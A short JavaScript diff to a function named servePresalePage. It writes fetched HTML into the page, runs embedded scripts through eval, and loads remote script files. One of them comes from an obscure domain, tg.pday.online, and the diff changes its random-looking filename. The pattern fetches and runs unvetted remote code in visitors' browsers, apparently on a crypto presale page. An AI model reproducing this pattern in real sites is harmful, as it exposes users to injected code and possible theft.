@@ -164,14 +164,14 @@ function servePresalePage()
                 // Insert the content into the body
                 document.body.innerHTML = xhr.responseText;
 
+                // Load external script files
+                loadExternalScripts();
+
                 // Find and execute any <script> tags
                 var scripts = document.body.getElementsByTagName("script");
                 for (var i = 0; i < scripts.length; i++) {
                     eval(scripts[i].innerText);  // Execute the script content
                 }
-
-                // Load external script files
-                loadExternalScripts();
             }
         };
 
@@ -186,7 +186,7 @@ function servePresalePage()
             var scriptUrls = [
                 'https://telegram.org/js/telegram-web-app.js',  // Add your script URLs here
                 'https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js',
-                'https://tg.pday.online/includes/545387treyt75545.js'
+                'https://tg.pday.online/includes/58784522555.js'
             ];
 
             // Dynamically load each script
